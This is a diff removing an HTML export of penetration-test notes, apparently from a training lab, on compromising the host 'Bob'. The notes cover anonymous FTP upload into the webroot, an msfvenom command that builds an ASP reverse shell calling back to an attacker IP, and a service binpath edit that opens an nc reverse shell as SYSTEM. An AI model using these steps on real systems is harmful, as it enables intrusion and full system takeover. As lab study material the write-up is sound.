@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>10.11.1.14 Bob</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>10.11.1.14 Bob</h1><br/>Nmap showed that ports 21, 23, 25, 80, 110, 220, and 443 were open.<br />FTP anonymous was enabled.<br />Chris verified that he could upload files to the wwwroot directory on the ftp server.<br />wwwroot is also the webroot for port 80.<br />He used msfvenom to craft code that when executed would give him a reverse shell.<br />msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.167 lport=80 -f asp -a x86 --platform win  &gt; shell.asp<br />During enumeration using accecsschk.exe he found that he could edit the service upnphost and then run it.<br />He edited the binpath to create a reverse shell via nc when started.<br />He started the service and gained a new reverse shell as nt authority\system.<br /><br /><br /><br /><br /><br /><br />a26f37da4583ff68f44d133d12ae3459</div></body></html>
